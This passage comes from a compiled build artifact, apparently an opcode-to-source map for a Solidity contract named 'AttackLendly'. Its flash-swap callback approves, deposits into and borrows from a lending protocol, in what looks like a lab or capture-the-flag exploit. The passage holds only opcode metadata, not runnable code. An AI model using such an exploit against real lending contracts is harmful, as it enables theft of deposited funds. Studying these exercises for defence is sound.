      "fn": "AttackLendly.uniswapV2Call",
      "jump": "i",
      "offset": [
        2411,
        2428
      ],
      "op": "JUMP",
      "path": "3"
    },
    "583": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2411,
        2428
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "584": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "PUSH1",
      "path": "3",
      "statement": 4,
      "value": "0x40"
    },
    "586": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "587": {
      "op": "PUSH4",
      "value": "0x95EA7B3"
    },
    "592": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "594": {
      "op": "SHL"
    },
    "595": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "DUP2",
      "path": "3"
    },
    "596": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "597": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "599": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "601": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "603": {
      "op": "SHL"
    },
    "604": {
      "op": "SUB"
    },
    "605": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2460,
        2466
      ],
      "op": "PUSH32",
      "path": "3",
      "value": "0x0"
    },
    "638": {
      "op": "DUP2"
    },
    "639": {
      "op": "AND"
    },
    "640": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "642": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "DUP4",
      "path": "3"
    },
    "643": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "ADD",
      "path": "3"
    },
    "644": {
      "op": "MSTORE"
    },
    "645": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "647": {
      "op": "DUP3"
    },
    "648": {
      "op": "ADD"
    },
    "649": {
      "op": "DUP4"
    },
    "650": {
      "op": "SWAP1"
    },
    "651": {
      "op": "MSTORE"
    },
    "652": {
      "op": "SWAP2"
    },
    "653": {
      "op": "SWAP3"
    },
    "654": {
      "op": "POP"
    },
    "655": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2451
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "656": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2451
      ],
      "op": "DUP5",
      "path": "3"
    },
    "657": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2451
      ],
      "op": "AND",
      "path": "3"
    },
    "658": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2451
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "659": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2451
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0x95EA7B3"
    },
    "664": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2451
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "665": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "667": {
      "op": "ADD"
    },
    "668": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x20"
    },
    "670": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "672": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "673": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "DUP1",
      "path": "3"
    },
    "674": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "DUP4",
      "path": "3"
    },
    "675": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "SUB",
      "path": "3"
    },
    "676": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "DUP2",
      "path": "3"
    },
    "677": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "679": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "DUP8",
      "path": "3"
    },
    "680": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "GAS",
      "path": "3"
    },
    "681": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "CALL",
      "path": "3"
    },
    "682": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "683": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "DUP1",
      "path": "3"
    },
    "684": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "685": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x2BA"
    },
    "688": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "689": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "690": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "692": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "DUP1",
      "path": "3"
    },
    "693": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "RETURNDATACOPY",
      "path": "3"
    },
    "694": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "695": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "697": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "REVERT",
      "path": "3"
    },
    "698": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "699": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "POP",
      "path": "3"
    },
    "700": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "POP",
      "path": "3"
    },
    "701": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "POP",
      "path": "3"
    },
    "702": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "POP",
      "path": "3"
    },
    "703": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "705": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "706": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "707": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "709": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "NOT",
      "path": "3"
    },
    "710": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "712": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "DUP3",
      "path": "3"
    },
    "713": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "ADD",
      "path": "3"
    },
    "714": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "AND",
      "path": "3"
    },
    "715": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "DUP3",
      "path": "3"
    },
    "716": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "ADD",
      "path": "3"
    },
    "717": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "DUP1",
      "path": "3"
    },
    "718": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "720": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "721": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "POP",
      "path": "3"
    },
    "722": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "DUP2",
      "path": "3"
    },
    "723": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "ADD",
      "path": "3"
    },
    "724": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "725": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x2DE"
    },
    "728": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "729": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "730": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xE2D"
    },
    "733": {
      "fn": "AttackLendly.uniswapV2Call",
      "jump": "i",
      "offset": [
        2438,
        2483
      ],
      "op": "JUMP",
      "path": "3"
    },
    "734": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2438,
        2483
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "735": {
      "op": "POP"
    },
    "736": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "PUSH1",
      "path": "3",
      "statement": 5,
      "value": "0x40"
    },
    "738": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "739": {
      "op": "PUSH4",
      "value": "0x11F9FBC9"
    },
    "744": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "746": {
      "op": "SHL"
    },
    "747": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "DUP2",
      "path": "3"
    },
    "748": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "749": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "751": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "753": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "755": {
      "op": "SHL"
    },
    "756": {
      "op": "SUB"
    },
    "757": {
      "op": "DUP5"
    },
    "758": {
      "op": "DUP2"
    },
    "759": {
      "op": "AND"
    },
    "760": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "762": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "DUP4",
      "path": "3"
    },
    "763": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "ADD",
      "path": "3"
    },
    "764": {
      "op": "MSTORE"
    },
    "765": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "767": {
      "op": "DUP3"
    },
    "768": {
      "op": "ADD"
    },
    "769": {
      "op": "DUP4"
    },
    "770": {
      "op": "SWAP1"
    },
    "771": {
      "op": "MSTORE"
    },
    "772": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2499
      ],
      "op": "PUSH32",
      "path": "3",
      "value": "0x0"
    },
    "805": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2507
      ],
      "op": "AND",
      "path": "3"
    },
    "806": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2507
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "807": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2507
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0x47E7EF24"
    },
    "812": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2507
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "813": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "815": {
      "op": "ADD"
    },
    "816": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "818": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "820": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "821": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "DUP1",
      "path": "3"
    },
    "822": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "DUP4",
      "path": "3"
    },
    "823": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "SUB",
      "path": "3"
    },
    "824": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "DUP2",
      "path": "3"
    },
    "825": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "827": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "DUP8",
      "path": "3"
    },
    "828": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "DUP1",
      "path": "3"
    },
    "829": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "EXTCODESIZE",
      "path": "3"
    },
    "830": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "831": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "DUP1",
      "path": "3"
    },
    "832": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "833": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x349"
    },
    "836": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "837": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "839": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "DUP1",
      "path": "3"
    },
    "840": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "REVERT",
      "path": "3"
    },
    "841": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "842": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "POP",
      "path": "3"
    },
    "843": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "GAS",
      "path": "3"
    },
    "844": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "CALL",
      "path": "3"
    },
    "845": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "846": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "DUP1",
      "path": "3"
    },
    "847": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "848": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x35D"
    },
    "851": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "852": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "853": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "855": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "DUP1",
      "path": "3"
    },
    "856": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "RETURNDATACOPY",
      "path": "3"
    },
    "857": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "858": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "860": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "REVERT",
      "path": "3"
    },
    "861": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "862": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "POP",
      "path": "3"
    },
    "863": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "POP",
      "path": "3"
    },
    "864": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "POP",
      "path": "3"
    },
    "865": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2493,
        2538
      ],
      "op": "POP",
      "path": "3"
    },
    "866": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2590,
        2607
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "868": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2617,
        2642
      ],
      "op": "DUP1",
      "path": "3"
    },
    "869": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2664,
        2670
      ],
      "op": "PUSH32",
      "path": "3",
      "value": "0x0"
    },
    "902": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "904": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "906": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "908": {
      "op": "SHL"
    },
    "909": {
      "op": "SUB"
    },
    "910": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2655,
        2670
      ],
      "op": "AND",
      "path": "3"
    },
    "911": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2655,
        2660
      ],
      "op": "DUP6",
      "path": "3"
    },
    "912": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "914": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "916": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "918": {
      "op": "SHL"
    },
    "919": {
      "op": "SUB"
    },
    "920": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2655,
        2670
      ],
      "op": "AND",
      "path": "3"
    },
    "921": {
      "branch": 36,
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2655,
        2670
      ],
      "op": "SUB",
      "path": "3"
    },
    "922": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2652,
        2850
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x3C9"
    },
    "925": {
      "branch": 36,
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2652,
        2850
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "926": {
      "op": "POP"
    },
    "927": {
      "op": "POP"
    },
    "928": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2739,
        2747
      ],
      "op": "PUSH1",
      "path": "3",
      "statement": 6,
      "value": "0x2"
    },
    "930": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2739,
        2747
      ],
      "op": "SLOAD",
      "path": "3"
    },
    "931": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2699,
        2705
      ],
      "op": "PUSH32",
      "path": "3",
      "statement": 7,
      "value": "0x0"
    },
    "964": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2699,
        2705
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "965": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2652,
        2850
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x3F1"
    },
    "968": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2652,
        2850
      ],
      "op": "JUMP",
      "path": "3"
    },
    "969": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2652,
        2850
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "970": {
      "op": "POP"
    },
    "971": {
      "op": "POP"
    },
    "972": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2831,
        2839
      ],
      "op": "PUSH1",
      "path": "3",
      "statement": 8,
      "value": "0x1"
    },
    "974": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2831,
        2839
      ],
      "op": "SLOAD",
      "path": "3"
    },
    "975": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2791,
        2797
      ],
      "op": "PUSH32",
      "path": "3",
      "statement": 9,
      "value": "0x0"
    },
    "1008": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2791,
        2797
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1009": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2652,
        2850
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1010": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "PUSH1",
      "path": "3",
      "statement": 10,
      "value": "0x40"
    },
    "1012": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "1013": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "1018": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1020": {
      "op": "SHL"
    },
    "1021": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1022": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "1023": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1025": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1027": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1029": {
      "op": "SHL"
    },
    "1030": {
      "op": "SUB"
    },
    "1031": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2904
      ],
      "op": "PUSH32",
      "path": "3",
      "value": "0x0"
    },
    "1064": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2911
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1065": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2911
      ],
      "op": "AND",
      "path": "3"
    },
    "1066": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "1068": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "DUP4",
      "path": "3"
    },
    "1069": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "ADD",
      "path": "3"
    },
    "1070": {
      "op": "DUP2"
    },
    "1071": {
      "op": "SWAP1"
    },
    "1072": {
      "op": "MSTORE"
    },
    "1073": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2911
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "1074": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2911
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0x4B8A3529"
    },
    "1079": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2911
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "1080": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2920,
        2930
      ],
      "op": "DUP6",
      "path": "3"
    },
    "1081": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2920,
        2930
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "1082": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2953
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1083": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2953
      ],
      "op": "DUP3",
      "path": "3"
    },
    "1084": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2953
      ],
      "op": "AND",
      "path": "3"
    },
    "1085": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2953
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1086": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2953
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0x70A08231"
    },
    "1091": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2953
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1092": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1094": {
      "op": "ADD"
    },
    "1095": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x20"
    },
    "1097": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "1099": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "1100": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1101": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "DUP4",
      "path": "3"
    },
    "1102": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "SUB",
      "path": "3"
    },
    "1103": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1104": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "DUP7",
      "path": "3"
    },
    "1105": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "GAS",
      "path": "3"
    },
    "1106": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "STATICCALL",
      "path": "3"
    },
    "1107": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "1108": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1109": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "1110": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x463"
    },
    "1113": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "1114": {
